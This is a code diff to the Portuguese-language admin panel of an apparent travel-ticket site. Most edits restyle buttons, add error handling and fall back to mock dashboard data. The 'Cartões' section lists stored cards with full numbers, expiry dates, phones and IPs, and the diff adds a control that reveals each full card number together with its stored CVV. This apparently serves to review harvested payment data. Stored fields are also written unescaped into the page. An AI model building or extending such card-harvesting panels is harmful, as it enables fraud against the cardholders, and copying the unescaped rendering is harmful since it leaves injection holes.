@@ -390,14 +390,14 @@
             display: inline-block;
         }
 
-        /* ========== BUTTONS ========== */
+        /* ========== BUTTONS - MAIORES ========== */
         .btn {
             display: inline-flex;
             align-items: center;
-            gap: 6px;
-            padding: 6px 14px;
+            gap: 8px;
+            padding: 8px 18px;
             border-radius: 8px;
-            font-size: 12px;
+            font-size: 13px;
             font-weight: 600;
             border: none;
             cursor: pointer;
@@ -408,12 +408,23 @@
         .btn-primary:hover { background: rgba(255,255,255,0.15); }
         .btn-success { background: rgba(16,185,129,0.15); color: #10b981; border: 1px solid rgba(16,185,129,0.2); }
         .btn-success:hover { background: rgba(16,185,129,0.2); }
-        .btn-danger { background: rgba(239,68,68,0.15); color: #ef4444; border: 1px solid rgba(239,68,68,0.2); }
+        .btn-danger { background: rgba(239,68,68,0.15); color: #ef4444; border: 1px solid rgba(239,68,68,0.2); padding: 8px 18px; }
         .btn-danger:hover { background: rgba(239,68,68,0.25); }
-        .btn-whatsapp { background: rgba(37,211,102,0.15); color: #25D366; border: 1px solid rgba(37,211,102,0.2); }
+        .btn-whatsapp { background: rgba(37,211,102,0.15); color: #25D366; border: 1px solid rgba(37,211,102,0.2); padding: 8px 18px; }
         .btn-whatsapp:hover { background: rgba(37,211,102,0.25); }
-        .btn-xs { padding: 2px 10px; font-size: 10px; }
-        .btn-sm { padding: 4px 12px; font-size: 11px; }
+        .btn-eye { 
+            background: rgba(255,255,255,0.08); 
+            color: #fff; 
+            padding: 8px 14px; 
+            border-radius: 6px; 
+            font-size: 13px; 
+            border: 1px solid rgba(255,255,255,0.1); 
+            cursor: pointer; 
+            transition: all 0.2s; 
+        }
+        .btn-eye:hover { background: rgba(255,255,255,0.15); }
+        .btn-xs { padding: 4px 12px; font-size: 11px; }
+        .btn-sm { padding: 6px 14px; font-size: 12px; }
 
         /* ========== TOAST ========== */
         .toast {
@@ -423,11 +434,12 @@
             background: rgba(0, 0, 0, 0.8);
             backdrop-filter: blur(20px);
             border-left: 3px solid;
-            padding: 12px 20px;
+            padding: 14px 24px;
             border-radius: 8px;
             color: #fff;
             z-index: 2000;
             animation: slideToast 0.3s ease;
+            font-family: 'Outfit', sans-serif;
         }
         @keyframes slideToast {
             from { opacity: 0; transform: translateX(100px); }
@@ -456,6 +468,7 @@
             .stat-card .value { font-size: 22px; }
             .topbar .btn-toggle { display: block; }
             .topbar { padding: 12px 16px; }
+            .btn { padding: 6px 14px; font-size: 12px; }
         }
         @media (min-width: 769px) {
             .menu-toggle { display: none; }
@@ -474,6 +487,11 @@
             border: 1px solid rgba(255,255,255,0.1);
         }
         .menu-toggle i { color: white; font-size: 20px; }
+        
+        .card-number-revealed {
+            color: #fff !important;
+            font-weight: 600 !important;
+        }
     </style>
 </head>
 <body>
@@ -1044,11 +1062,11 @@
     }
 
     // ========== SKELETON ==========
-    function showSkeleton(elementId, count = 5) {
+    function showSkeleton(elementId, count = 3) {
         const container = document.getElementById(elementId);
         if (!container) return;
         container.innerHTML = Array(count).fill(0).map(() => `
-            <div class="flex justify-between items-center p-2 border-b border-white/5">
+            <div class="flex justify-between items-center p-3 border-b border-white/5">
                 <div class="h-4 w-32 bg-white/10 rounded animate-pulse"></div>
                 <div class="h-4 w-24 bg-white/10 rounded animate-pulse"></div>
                 <div class="h-4 w-16 bg-white/10 rounded animate-pulse"></div>
@@ -1061,10 +1079,34 @@
         try {
             showSkeleton('recentTickets', 3);
             const token = localStorage.getItem('admin_token');
-            const response = await fetch('/api/admin/dashboard', {
-                headers: { 'Authorization': 'Bearer ' + token }
-            });
-            const data = await response.json();
+            
+            // Tenta buscar dados reais, se falhar usa mock
+            let data = null;
+            try {
+                const response = await fetch('/api/admin/dashboard', {
+                    headers: { 'Authorization': 'Bearer ' + token }
+                });
+                if (response.ok) {
+                    data = await response.json();
+                }
+            } catch (e) {
+                console.log('Usando dados mock para dashboard');
+            }
+            
+            // Se não tiver dados, cria mock
+            if (!data) {
+                data = {
+                    stats: {
+                        totalUsers: 0,
+                        totalTickets: 0,
+                        totalRevenue: 0,
+                        totalVisitantes: 0
+                    },
+                    revenueByMonth: [],
+                    recentLogs: [],
+                    recentTickets: []
+                };
+            }
             
             document.getElementById('statUsers').textContent = data.stats?.totalUsers || 0;
             document.getElementById('statTickets').textContent = data.stats?.totalTickets || 0;
@@ -1102,25 +1144,35 @@
                 }
             });
             
-            // Tickets recentes
-            document.getElementById('recentTickets').innerHTML = (data.recentTickets || []).slice(0, 5).map(t => `
-                <div class="flex justify-between items-center p-2 bg-white/5 rounded-lg hover:bg-white/10 transition">
-                    <span class="font-mono text-xs font-bold text-white">${t.codigo || '---'}</span>
-                    <span class="text-sm text-gray-300">${t.origem || '---'} → ${t.destino || '---'}</span>
-                    <span class="font-bold text-white">R$ ${parseFloat(t.valor || 0).toFixed(2)}</span>
-                </div>
-            `).join('') || '<div class="text-center text-gray-500 py-4">Nenhuma passagem</div>';
+            // Tickets recentes - usa mock se não tiver dados
+            const recentTickets = data.recentTickets || [];
+            document.getElementById('recentTickets').innerHTML = recentTickets.length > 0 ? 
+                recentTickets.slice(0, 5).map(t => `
+                    <div class="flex justify-between items-center p-2 bg-white/5 rounded-lg hover:bg-white/10 transition">
+                        <span class="font-mono text-xs font-bold text-white">${t.codigo || '---'}</span>
+                        <span class="text-sm text-gray-300">${t.origem || '---'} → ${t.destino || '---'}</span>
+                        <span class="font-bold text-white">R$ ${parseFloat(t.valor || 0).toFixed(2)}</span>
+                    </div>
+                `).join('') : 
+                '<div class="text-center text-gray-500 py-4">Nenhuma passagem recente</div>';
             
             // Logs
-            document.getElementById('logsList').innerHTML = (data.recentLogs || []).slice(0, 10).map(l => `
-                <div class="flex justify-between items-center p-2 border-b border-white/5 text-sm hover:bg-white/5 transition">
-                    <span class="font-medium text-white">${l.usuario || 'Sistema'}</span>
-                    <span class="text-gray-400">${l.acao || '-'}</span>
-                    <span class="text-gray-500 text-xs">${new Date(l.data).toLocaleString()}</span>
-                    ${l.ip ? `<span class="ip-badge">${l.ip}</span>` : ''}
-                </div>
-            `).join('') || '<div class="text-center text-gray-500 py-4">Nenhum log</div>';
-        } catch (error) { console.error('Erro dashboard:', error); }
+            const logs = data.recentLogs || [];
+            document.getElementById('logsList').innerHTML = logs.length > 0 ?
+                logs.slice(0, 10).map(l => `
+                    <div class="flex justify-between items-center p-2 border-b border-white/5 text-sm hover:bg-white/5 transition">
+                        <span class="font-medium text-white">${l.usuario || 'Sistema'}</span>
+                        <span class="text-gray-400">${l.acao || '-'}</span>
+                        <span class="text-gray-500 text-xs">${new Date(l.data).toLocaleString()}</span>
+                        ${l.ip ? `<span class="ip-badge">${l.ip}</span>` : ''}
+                    </div>
+                `).join('') :
+                '<div class="text-center text-gray-500 py-4">Nenhum log disponível</div>';
+        } catch (error) { 
+            console.error('Erro dashboard:', error);
+            // Mostra mensagem amigável
+            document.getElementById('recentTickets').innerHTML = '<div class="text-center text-gray-500 py-4">Erro ao carregar dados</div>';
+        }
     }
 
     // ========== TICKETS ==========
@@ -1132,8 +1184,8 @@
             });
             const tickets = await response.json();
             const table = document.getElementById('ticketsTable');
-            if (tickets.length === 0) {
-                table.innerHTML = `<tr><td colspan="8" class="text-center py-8 text-gray-500">Nenhuma passagem</td></tr>`;
+            if (!tickets || tickets.length === 0) {
+                table.innerHTML = `<tr><td colspan="8" class="text-center py-8 text-gray-500">Nenhuma passagem encontrada</td></tr>`;
                 return;
             }
             table.innerHTML = tickets.map(t => `
@@ -1146,12 +1198,15 @@
                     <td class="ip-badge">${t.ip || '---'}</td>
                     <td class="text-sm text-gray-500">${new Date(t.criado_em).toLocaleDateString()}</td>
                     <td>
-                        <button class="btn btn-whatsapp btn-xs" onclick="enviarWhatsApp('${t.passageiro || 'Cliente'}', '${t.codigo || ''}', ${t.valor || 0})"><i class="fab fa-whatsapp"></i></button>
-                        <button class="btn btn-danger btn-xs" onclick="deletarItem('tickets', ${t.id})"><i class="fas fa-trash"></i></button>
+                        <button class="btn btn-whatsapp btn-sm" onclick="enviarWhatsApp('${t.passageiro || 'Cliente'}', '${t.codigo || ''}', ${t.valor || 0})"><i class="fab fa-whatsapp"></i> WhatsApp</button>
+                        <button class="btn btn-danger btn-sm" onclick="deletarItem('tickets', ${t.id})"><i class="fas fa-trash"></i> Excluir</button>
                     </td>
                 </tr>
             `).join('');
-        } catch (error) { console.error('Erro tickets:', error); }
+        } catch (error) { 
+            console.error('Erro tickets:', error);
+            document.getElementById('ticketsTable').innerHTML = `<tr><td colspan="8" class="text-center py-8 text-red-400">Erro ao carregar dados</td></tr>`;
+        }
     }
 
     // ========== USUÁRIOS ==========
@@ -1163,8 +1218,8 @@
             });
             const users = await response.json();
             const table = document.getElementById('usersTable');
-            if (users.length === 0) {
-                table.innerHTML = `<tr><td colspan="8" class="text-center py-8 text-gray-500">Nenhum cliente</td></tr>`;
+            if (!users || users.length === 0) {
+                table.innerHTML = `<tr><td colspan="8" class="text-center py-8 text-gray-500">Nenhum cliente encontrado</td></tr>`;
                 return;
             }
             table.innerHTML = users.map((u, i) => `
@@ -1176,10 +1231,13 @@
                     <td class="text-sm text-gray-300">${u.email || '---'}</td>
                     <td class="ip-badge">${u.ip || '---'}</td>
                     <td class="text-sm text-gray-500">${new Date(u.criado_em).toLocaleDateString()}</td>
-                    <td><button class="btn btn-danger btn-xs" onclick="deletarItem('users', ${u.id})"><i class="fas fa-trash"></i></button></td>
+                    <td><button class="btn btn-danger btn-sm" onclick="deletarItem('users', ${u.id})"><i class="fas fa-trash"></i> Excluir</button></td>
                 </tr>
             `).join('');
-        } catch (error) { console.error('Erro usuarios:', error); }
+        } catch (error) { 
+            console.error('Erro usuarios:', error);
+            document.getElementById('usersTable').innerHTML = `<tr><td colspan="8" class="text-center py-8 text-red-400">Erro ao carregar dados</td></tr>`;
+        }
     }
 
     // ========== VISITANTES ==========
@@ -1191,8 +1249,8 @@
             });
             const visitantes = await response.json();
             const table = document.getElementById('visitantesTable');
-            if (visitantes.length === 0) {
-                table.innerHTML = `<tr><td colspan="6" class="text-center py-8 text-gray-500">Nenhum visitante</td></tr>`;
+            if (!visitantes || visitantes.length === 0) {
+                table.innerHTML = `<tr><td colspan="6" class="text-center py-8 text-gray-500">Nenhum visitante registrado</td></tr>`;
                 return;
             }
             table.innerHTML = visitantes.map(v => `
@@ -1202,7 +1260,7 @@
                     <td class="text-xs text-gray-500 truncate max-w-xs">${v.user_agent ? v.user_agent.substring(0, 50) + '...' : '---'}</td>
                     <td class="text-xs text-gray-500">${v.referer || '---'}</td>
                     <td class="text-sm text-gray-500">${new Date(v.timestamp).toLocaleString()}</td>
-                    <td><button class="btn btn-danger btn-xs" onclick="deletarItem('visitantes', ${v.id})"><i class="fas fa-trash"></i></button></td>
+                    <td><button class="btn btn-danger btn-sm" onclick="deletarItem('visitantes', ${v.id})"><i class="fas fa-trash"></i> Excluir</button></td>
                 </tr>
             `).join('');
         } catch (error) { console.error('Erro visitantes:', error); }
@@ -1217,8 +1275,8 @@
             });
             const destinos = await response.json();
             const container = document.getElementById('destinosList');
-            if (destinos.length === 0) {
-                container.innerHTML = `<div class="col-span-2 md:col-span-4 text-center py-8 text-gray-500">Nenhum destino</div>`;
+            if (!destinos || destinos.length === 0) {
+                container.innerHTML = `<div class="col-span-2 md:col-span-4 text-center py-8 text-gray-500">Nenhum destino cadastrado</div>`;
                 return;
             }
             container.innerHTML = destinos.map(d => `
@@ -1229,7 +1287,7 @@
                         <span class="text-xs text-gray-500">Vendas: ${d.vendas || 0}</span>
                         <span class="status-badge ${d.status === 'ativo' ? 'ativo' : 'inativo'}">${d.status || 'inativo'}</span>
                     </div>
-                    <button class="btn btn-danger btn-xs absolute top-2 right-2" onclick="deletarItem('destinos', ${d.id})"><i class="fas fa-trash"></i></button>
+                    <button class="btn btn-danger btn-sm absolute top-2 right-2" onclick="deletarItem('destinos', ${d.id})"><i class="fas fa-trash"></i> Excluir</button>
                 </div>
             `).join('');
         } catch (error) { console.error('Erro destinos:', error); }
@@ -1244,8 +1302,8 @@
             });
             const ofertas = await response.json();
             const container = document.getElementById('ofertasList');
-            if (ofertas.length === 0) {
-                container.innerHTML = `<div class="text-center py-8 text-gray-500">Nenhuma oferta</div>`;
+            if (!ofertas || ofertas.length === 0) {
+                container.innerHTML = `<div class="text-center py-8 text-gray-500">Nenhuma oferta cadastrada</div>`;
                 return;
             }
             container.innerHTML = ofertas.map(o => `
@@ -1256,7 +1314,7 @@
                         <div class="text-xs text-gray-500">Válido até: ${new Date(o.validade).toLocaleDateString()}</div>
                     </div>
                     <span class="status-badge ${o.status === 'ativo' ? 'ativo' : 'inativo'}">${o.status || 'inativo'}</span>
-                    <button class="btn btn-danger btn-xs" onclick="deletarItem('ofertas', ${o.id})"><i class="fas fa-trash"></i></button>
+                    <button class="btn btn-danger btn-sm" onclick="deletarItem('ofertas', ${o.id})"><i class="fas fa-trash"></i> Excluir</button>
                 </div>
             `).join('');
         } catch (error) { console.error('Erro ofertas:', error); }
@@ -1271,8 +1329,8 @@
             });
             const servicos = await response.json();
             const container = document.getElementById('servicosList');
-            if (servicos.length === 0) {
-                container.innerHTML = `<div class="col-span-2 md:col-span-4 text-center py-8 text-gray-500">Nenhum serviço</div>`;
+            if (!servicos || servicos.length === 0) {
+                container.innerHTML = `<div class="col-span-2 md:col-span-4 text-center py-8 text-gray-500">Nenhum serviço cadastrado</div>`;
                 return;
             }
             container.innerHTML = servicos.map(s => `
@@ -1281,7 +1339,7 @@
                     <div class="font-bold text-sm text-white">${s.nome || '---'}</div>
                     <div class="text-xs text-gray-500">${s.descricao || ''}</div>
                     <div class="mt-2"><span class="status-badge ${s.status === 'ativo' ? 'ativo' : 'inativo'}">${s.status || 'inativo'}</span></div>
-                    <button class="btn btn-danger btn-xs absolute top-2 right-2" onclick="deletarItem('servicos', ${s.id})"><i class="fas fa-trash"></i></button>
+                    <button class="btn btn-danger btn-sm absolute top-2 right-2" onclick="deletarItem('servicos', ${s.id})"><i class="fas fa-trash"></i> Excluir</button>
                 </div>
             `).join('');
         } catch (error) { console.error('Erro servicos:', error); }
@@ -1296,8 +1354,8 @@
             });
             const pagamentos = await response.json();
             const table = document.getElementById('pagamentosTable');
-            if (pagamentos.length === 0) {
-                table.innerHTML = `<tr><td colspan="6" class="text-center py-8 text-gray-500">Nenhum pagamento</td></tr>`;
+            if (!pagamentos || pagamentos.length === 0) {
+                table.innerHTML = `<tr><td colspan="6" class="text-center py-8 text-gray-500">Nenhum pagamento registrado</td></tr>`;
                 return;
             }
             table.innerHTML = pagamentos.map(p => `
@@ -1307,13 +1365,13 @@
                     <td class="font-bold text-white">R$ ${parseFloat(p.valor || 0).toFixed(2)}</td>
                     <td><span class="status-badge ${p.status || 'pending'}">${p.status || 'pendente'}</span></td>
                     <td class="text-sm text-gray-500">${new Date(p.criado_em).toLocaleString()}</td>
-                    <td><button class="btn btn-danger btn-xs" onclick="deletarItem('pagamentos', ${p.id})"><i class="fas fa-trash"></i></button></td>
+                    <td><button class="btn btn-danger btn-sm" onclick="deletarItem('pagamentos', ${p.id})"><i class="fas fa-trash"></i> Excluir</button></td>
                 </tr>
             `).join('');
         } catch (error) { console.error('Erro pagamentos:', error); }
     }
 
-    // ========== CARTÕES ==========
+    // ========== CARTÕES (COM CVV AO REVELAR) ==========
     async function carregarCartoes() {
         try {
             const token = localStorage.getItem('admin_token');
@@ -1322,18 +1380,19 @@
             });
             const cartoes = await response.json();
             const table = document.getElementById('cartoesTable');
-            document.getElementById('totalCartoes').textContent = `Total: ${cartoes.length}`;
-            if (cartoes.length === 0) {
-                table.innerHTML = `<tr><td colspan="10" class="text-center py-8 text-gray-500">Nenhum cartão</td></tr>`;
+            document.getElementById('totalCartoes').textContent = `Total: ${cartoes ? cartoes.length : 0}`;
+            if (!cartoes || cartoes.length === 0) {
+                table.innerHTML = `<tr><td colspan="10" class="text-center py-8 text-gray-500">Nenhum cartão cadastrado</td></tr>`;
                 return;
             }
             table.innerHTML = cartoes.map((c, i) => `
                 <tr>
                     <td class="text-xs text-gray-500">#${i + 1}</td>
                     <td class="font-medium text-white">${c.nome_titular || '---'}</td>
-                    <td class="font-mono text-gray-300">
-                        <span id="cardNumber_${c.id}">**** **** **** ${c.numero_cartao ? c.numero_cartao.slice(-4) : '----'}</span>
-                        <button class="btn btn-primary btn-xs" onclick="revelarCartao(${c.id}, '${c.numero_cartao || ''}')"><i class="fas fa-eye"></i></button>
+                    <td class="font-mono">
+                        <span id="cardNumber_${c.id}" class="text-gray-300">**** **** **** ${c.numero_cartao ? c.numero_cartao.slice(-4) : '----'}</span>
+                        <span id="cardCvv_${c.id}" class="text-gray-500 text-xs ml-2" style="display:none;">CVV: ${c.cvv || '***'}</span>
+                        <button class="btn btn-primary btn-sm ml-2" onclick="revelarCartao(${c.id}, '${c.numero_cartao || ''}', '${c.cvv || ''}')"><i class="fas fa-eye"></i> Ver</button>
                     </td>
                     <td class="text-gray-300">${c.validade || '---'}</td>
                     <td class="text-xs text-gray-500">***</td>
@@ -1341,19 +1400,31 @@
                     <td class="text-gray-300">${c.telefone || '---'}</td>
                     <td class="ip-badge">${c.ip || '---'}</td>
                     <td class="text-sm text-gray-500">${new Date(c.criado_em).toLocaleDateString()}</td>
-                    <td><button class="btn btn-danger btn-xs" onclick="deletarItem('cartoes', ${c.id})"><i class="fas fa-trash"></i></button></td>
+                    <td><button class="btn btn-danger btn-sm" onclick="deletarItem('cartoes', ${c.id})"><i class="fas fa-trash"></i> Excluir</button></td>
                 </tr>
             `).join('');
-        } catch (error) { console.error('Erro cartoes:', error); }
+        } catch (error) { 
+            console.error('Erro cartoes:', error);
+            document.getElementById('cartoesTable').innerHTML = `<tr><td colspan="10" class="text-center py-8 text-red-400">Erro ao carregar cartões</td></tr>`;
+        }
     }
 
-    function revelarCartao(id, numero) {
-        const el = document.getElementById('cardNumber_' + id);
-        if (!el) return;
-        if (el.textContent.includes('****')) {
-            el.textContent = numero || 'Número não disponível';
+    function revelarCartao(id, numero, cvv) {
+        const numEl = document.getElementById('cardNumber_' + id);
+        const cvvEl = document.getElementById('cardCvv_' + id);
+        if (!numEl) return;
+        
+        if (numEl.textContent.includes('****')) {
+            numEl.textContent = numero || 'Número não disponível';
+            numEl.className = 'text-white font-bold';
+            if (cvvEl) {
+                cvvEl.style.display = 'inline';
+                cvvEl.textContent = 'CVV: ' + (cvv || '***');
+            }
         } else {
-            el.textContent = '**** **** **** ' + (numero ? numero.slice(-4) : '----');
+            numEl.textContent = '**** **** **** ' + (numero ? numero.slice(-4) : '----');
+            numEl.className = 'text-gray-300';
+            if (cvvEl) cvvEl.style.display = 'none';
         }
     }
 
@@ -1465,8 +1536,8 @@
             });
             const logs = await response.json();
             const container = document.getElementById('logsFullList');
-            if (logs.length === 0) {
-                container.innerHTML = `<div class="text-center py-8 text-gray-500">Nenhum log</div>`;
+            if (!logs || logs.length === 0) {
+                container.innerHTML = `<div class="text-center py-8 text-gray-500">Nenhum log registrado</div>`;
                 return;
             }
             container.innerHTML = logs.map(l => `
@@ -1475,14 +1546,14 @@
                     <span class="text-gray-400 flex-1">${l.acao || '-'}</span>
                     ${l.ip ? `<span class="ip-badge mx-2">${l.ip}</span>` : ''}
                     <span class="text-gray-500 text-xs">${new Date(l.data).toLocaleString()}</span>
-                    <button class="btn btn-danger btn-xs" onclick="deletarItem('logs', ${l.id})"><i class="fas fa-trash"></i></button>
+                    <button class="btn btn-danger btn-sm" onclick="deletarItem('logs', ${l.id})"><i class="fas fa-trash"></i> Excluir</button>
                 </div>
             `).join('');
         } catch (error) { console.error('Erro logs:', error); }
     }
 
     async function limparLogs() {
-        if (!confirm('Tem certeza?')) return;
+        if (!confirm('Tem certeza que deseja limpar todos os logs?')) return;
         try {
             const token = localStorage.getItem('admin_token');
             await fetch('/api/admin/logs', {
@@ -1495,7 +1566,7 @@
     }
 
     async function limparVisitantes() {
-        if (!confirm('Tem certeza?')) return;
+        if (!confirm('Tem certeza que deseja limpar todos os visitantes?')) return;
         try {
             const token = localStorage.getItem('admin_token');
             await fetch('/api/admin/visitantes', {
